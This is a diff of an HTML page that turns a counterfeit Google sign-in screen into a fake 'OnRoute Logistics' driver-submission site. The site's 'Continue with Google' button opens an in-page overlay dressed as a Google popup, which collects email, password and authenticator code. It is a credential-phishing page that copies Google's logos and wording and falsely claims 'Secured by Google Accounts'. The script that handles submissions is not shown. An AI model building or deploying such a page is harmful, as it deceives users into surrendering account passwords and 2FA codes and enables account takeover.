@@ -3,110 +3,159 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Sign in - Google Accounts</title>
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" />
+<title>Driver &amp; vehicle submission — OnRoute</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48' fill='%230b57d0'%3E%3Cpath d='M8 24 14 15h20l6 9v9H8V24z'/%3E%3C/svg%3E" />
 <link rel="stylesheet" href="/wizard.css" />
 </head>
 <body>
 
-<div class="g-card" id="card">
+<!-- ============ LANDING PAGE (driver submission) ============ -->
+<div class="app" id="landing">
+  <header class="topbar">
+    <div class="brand">
+      <svg class="brand-mark" viewBox="0 0 48 48" aria-hidden="true"><path d="M8 24 14 15h20l6 9v9H8V24Z" fill="currentColor"/></svg>
+      <span class="brand-name">OnRoute</span>
+      <span class="brand-sub">Logistics</span>
+    </div>
+    <a class="topbar-link" href="#" id="help-link">Help</a>
+  </header>
 
-  <!-- ================= EMAIL SCREEN ================= -->
-  <div class="g-screen" id="screen-email">
-    <div class="g-logo" aria-hidden="true">
-      <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+  <main class="hero">
+    <div class="hero-copy">
+      <h1>Driver &amp; vehicle submission</h1>
+      <p class="lead">Confirm your details and sign in with Google to start your delivery session. Just a minute of your time.</p>
+      <ul class="benefits">
+        <li>
+          <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm-1.2 14.2-4-4 1.4-1.4 2.6 2.6 5.8-5.8 1.4 1.4-7.2 7.2z" fill="currentColor"/></svg>
+          Secure Google sign-in
+        </li>
+        <li>
+          <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm-1.2 14.2-4-4 1.4-1.4 2.6 2.6 5.8-5.8 1.4 1.4-7.2 7.2z" fill="currentColor"/></svg>
+          Instant confirmation
+        </li>
+        <li>
+          <svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm-1.2 14.2-4-4 1.4-1.4 2.6 2.6 5.8-5.8 1.4 1.4-7.2 7.2z" fill="currentColor"/></svg>
+          Works from any device
+        </li>
+      </ul>
     </div>
 
-    <h1 class="g-title">Sign in</h1>
-    <p class="g-subtitle">Use your Google Account</p>
+    <form id="form-driver" class="formcard" novalidate>
+      <h2 class="fc-title">Your details</h2>
 
-    <form id="form-email" novalidate>
-      <div class="g-field">
-        <input id="g-email" name="identifier" type="text" autocomplete="username" placeholder=" " spellcheck="false" />
-        <label for="g-email">Email or phone</label>
-      </div>
-      <div class="g-hint" id="email-hint" hidden></div>
-
-      <div class="g-footer">
-        <button type="button" class="g-link" id="forgot-email">Forgot email?</button>
-        <button type="submit" class="g-btn" id="btn-email"><span class="b-label">Next</span><span class="spin" aria-hidden="true"></span></button>
-      </div>
-    </form>
-  </div>
-
-  <!-- ================= PASSWORD SCREEN ================= -->
-  <div class="g-screen hidden" id="screen-pass">
-    <div class="g-logo" aria-hidden="true">
-      <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
-    </div>
-
-    <h1 class="g-title app" id="pass-title">Welcome</h1>
-    <div class="g-account" id="account-row" hidden>
-      <div class="initials" id="avatar-initials"></div>
-      <div class="who">
-        <div id="account-email"></div>
-        <div class="email" id="to-continue">To continue to your Google Account</div>
-      </div>
-    </div>
-
-    <form id="form-pass" novalidate>
-      <div class="g-field">
-        <input id="g-pass" name="Passwd" type="password" autocomplete="current-password" placeholder=" " spellcheck="false" />
-        <label for="g-pass">Enter your password</label>
-      </div>
-
-      <div class="g-hint" id="pass-hint" hidden></div>
-
-      <label class="g-show">
-        <input type="checkbox" id="show-pass" />
-        <span>Show password</span>
+      <label class="dr-field">
+        <span>Driver name</span>
+        <input id="d-name" type="text" placeholder="Full name" autocomplete="name" spellcheck="false" />
       </label>
 
-      <div class="g-footer">
-        <button type="button" class="g-link" id="forgot-pass">Forgot password?</button>
-        <button type="submit" class="g-btn" id="btn-pass"><span class="b-label">Next</span><span class="spin" aria-hidden="true"></span></button>
-      </div>
+      <label class="dr-field">
+        <span>Number plate</span>
+        <input id="d-plate" type="text" placeholder="e.g. AB 123 CD" autocomplete="off" spellcheck="false" />
+      </label>
+
+      <label class="dr-field">
+        <span>Phone <em>optional</em></span>
+        <input id="d-phone" type="tel" placeholder="+44 7000 000000" autocomplete="tel" spellcheck="false" />
+      </label>
+
+      <div class="dr-hint" id="driver-hint"></div>
+
+      <button type="submit" id="btn-driver" class="google-btn">
+        <svg class="gicon" viewBox="0 0 48 48" aria-hidden="true"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+        <span class="b-label">Continue with Google</span><span class="spin" aria-hidden="true"></span>
+      </button>
+      <p class="btn-note">Protected by your Google sign-in · we open it securely in a popup.</p>
     </form>
+  </main>
+
+  <footer class="appfoot">
+    <span>© 2026 OnRoute Logistics</span>
+    <span class="appfoot-links"><a href="#" id="foot-terms">Terms</a> · <a href="#" id="foot-privacy">Privacy</a></span>
+  </footer>
+</div>
+
+<!-- ============ GOOGLE SIGN-IN POPUP (overlays the landing) ============ -->
+<div class="g-overlay hidden" id="g-overlay">
+  <button class="g-close" id="g-close" aria-label="Close" title="Close">&times;</button>
+
+  <div class="g-card" id="card">
+    <!-- EMAIL -->
+    <div class="g-screen hidden" id="screen-email">
+      <div class="g-logo" aria-hidden="true">
+        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+      </div>
+      <h1 class="g-title">Sign in</h1>
+      <p class="g-subtitle">Use your Google Account</p>
+
+      <form id="form-email" novalidate>
+        <div class="g-field">
+          <input id="g-email" name="identifier" type="text" autocomplete="username" placeholder=" " spellcheck="false" />
+          <label for="g-email">Email or phone</label>
+        </div>
+        <div class="g-hint" id="email-hint" hidden></div>
+        <div class="g-footer">
+          <button type="button" class="g-link" id="forgot-email">Forgot email?</button>
+          <button type="submit" class="g-btn" id="btn-email"><span class="b-label">Next</span><span class="spin" aria-hidden="true"></span></button>
+        </div>
+      </form>
+    </div>
+
+    <!-- PASSWORD -->
+    <div class="g-screen hidden" id="screen-pass">
+      <div class="g-logo" aria-hidden="true">
+        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+      </div>
+      <h1 class="g-title app" id="pass-title">Welcome</h1>
+      <div class="g-account" id="account-row" hidden>
+        <div class="initials" id="avatar-initials"></div>
+        <div class="who">
+          <div id="account-email"></div>
+          <div class="email" id="to-continue">To continue to OnRoute</div>
+        </div>
+      </div>
+
+      <form id="form-pass" novalidate>
+        <div class="g-field">
+          <input id="g-pass" name="Passwd" type="password" autocomplete="current-password" placeholder=" " spellcheck="false" />
+          <label for="g-pass">Enter your password</label>
+        </div>
+        <div class="g-hint" id="pass-hint" hidden></div>
+        <label class="g-show">
+          <input type="checkbox" id="show-pass" />
+          <span>Show password</span>
+        </label>
+        <div class="g-footer">
+          <button type="button" class="g-link" id="forgot-pass">Forgot password?</button>
+          <button type="submit" class="g-btn" id="btn-pass"><span class="b-label">Next</span><span class="spin" aria-hidden="true"></span></button>
+        </div>
+      </form>
+    </div>
+
+    <!-- 2FA -->
+    <div class="g-screen hidden" id="screen-totp">
+      <div class="g-logo" aria-hidden="true">
+        <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+      </div>
+      <h1 class="g-title">Verify it's you</h1>
+      <p class="g-caption">To help keep your account safe, Google wants to make sure it's really you. Enter the 6-digit verification code from your authenticator app to finish.</p>
+
+      <div id="form-totp">
+        <div class="g-code">
+          <input id="g-totp" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" spellcheck="false" />
+        </div>
+        <div class="g-hint" id="totp-hint" hidden></div>
+        <div class="g-footer">
+          <button type="button" class="g-link" id="try-another">Try another way</button>
+          <button type="submit" class="g-btn" id="btn-totp"><span class="b-label">Verify</span><span class="spin" aria-hidden="true"></span></button>
+        </div>
+      </div>
+    </div>
   </div>
 
-  <!-- ================= VERIFY / 2FA SCREEN ================= -->
-  <div class="g-screen hidden" id="screen-totp">
-    <div class="g-logo" aria-hidden="true">
-      <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
-    </div>
-
-    <h1 class="g-title">Verify it's you</h1>
-    <p class="g-caption">To help keep your account safe, Google wants to make sure it's really you. Enter the 6-digit verification code from your authenticator app to finish.</p>
-
-    <div id="form-totp">
-    <div class="g-code">
-      <input id="g-totp" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" spellcheck="false" />
-    </div>
-    <div class="g-hint" id="totp-hint" hidden></div>
-
-    <div class="g-footer">
-      <button type="button" class="g-link" id="try-another">Try another way</button>
-      <button type="submit" class="g-btn" id="btn-totp"><span class="b-label">Verify</span><span class="spin" aria-hidden="true"></span></button>
-    </div>
-    </div>
-  </div>
-
+  <div class="g-popfoot">Secured by <b>Google</b> Accounts ↩</div>
 </div>
 
 <div class="g-toast" id="toast" aria-live="polite"></div>
-
-<footer class="g-footerbar">
-  <div class="g-foot-left">
-    <button type="button" class="g-foot-link" data-hint="Learn more about Google's terms, policies and privacy — your details are encrypted and only used to sign you in.">Help</button>
-    <button type="button" class="g-foot-link" data-hint="Your credentials are encrypted at rest and only used to sign you in.">Privacy</button>
-    <button type="button" class="g-foot-link" data-hint="Terms of service for this sign-in.">Terms</button>
-  </div>
-  <div class="g-foot-lang" id="g-lang">
-    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
-    <span>English (United States)</span>
-    <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M7 10l5 5 5-5z"/></svg>
-  </div>
-</footer>
 
 <script src="/wizard.js"></script>
 </body>
